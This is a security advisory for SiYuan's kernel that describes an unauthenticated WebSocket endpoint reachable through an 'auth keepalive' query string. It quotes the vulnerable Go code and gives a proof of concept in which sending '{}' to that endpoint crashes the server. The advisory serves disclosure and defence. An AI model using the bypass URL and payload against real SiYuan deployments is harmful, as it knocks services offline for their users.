# [H] SiYuan has an Unauthenticated WebSocket DoS via Auth Keepalive Bypass

## Summary
Severity: High
Advisory: GHSA-3g9h-9hp4-654v
CVE: CVE-2026-33203
CWE: CWE-248, CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-3g9h-9hp4-654v
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <3.6.2

## Details
## Summary
The SiYuan kernel WebSocket server accepts unauthenticated connections when a specific “auth keepalive” query parameter is present. After connection, incoming messages are parsed using unchecked type assertions on attacker-controlled JSON.

A remote attacker can send malformed messages that trigger a runtime panic, potentially crashing the kernel process and causing denial of service.

## Details
**1. Authentication Bypass via Keepalive Query**

Unauthenticated connections are accepted if the request URI matches a specific pattern intended for an authentication page keepalive.

**File: kernel/server/serve.go**

```
if !authOk {
    authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
             strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")
}

```

**2. Unsafe Type Assertions on Untrusted Input**

Incoming JSON messages are parsed into a generic map and fields are accessed without validation.

**File: kernel/server/serve.go**

```
cmdStr := request["cmd"].(string)
cmdId  := request["reqId"].(float64)
param  := request["param"].(map[string]interface{})

```
Malformed or missing fields trigger a runtime panic.
The handler does not implement local panic recovery, allowing crashes to propagate.

## PoC
**Step 1 — Prepare workspace directory**

```sh
mkdir -p ./workspace
```

**Step 2 — Run SiYuan container**

```
docker run -d \
  -p 6806:6806 \
  -e SIYUAN_ACCESS_AUTH_CODE_BYPASS=true \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan \
  --workspace=/siyuan/workspace
```

Service becomes reachable at http://127.0.0.1:6806

**Step 3 — Confirm service availability**

Open in browser:

```sh
http://127.0.0.1:6806
```

**Step 4 — Connect to unauthenticated WebSocket endpoint**

```sh
ws://127.0.0.1:6806/ws?app=siyuan&id=auth&type=auth
```

This connection is accepted without credentials.

**Step 5 — Send malformed payload**

Payload:

```sh

{}

```

**Step 6 — Observe behavior**

Monitor container logs:

```sh

docker logs -f <container_id>

```
## Impact
An unauthenticated attacker with network access can repeatedly crash the kernel, causing persistent denial of service.

Impact is highest when the service is exposed beyond localhost (e.g., Docker deployments, reverse proxies, LAN access, or public hosting).

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-3g9h-9hp4-654v
- https://nvd.nist.gov/vuln/detail/CVE-2026-33203
- https://github.com/siyuan-note/siyuan
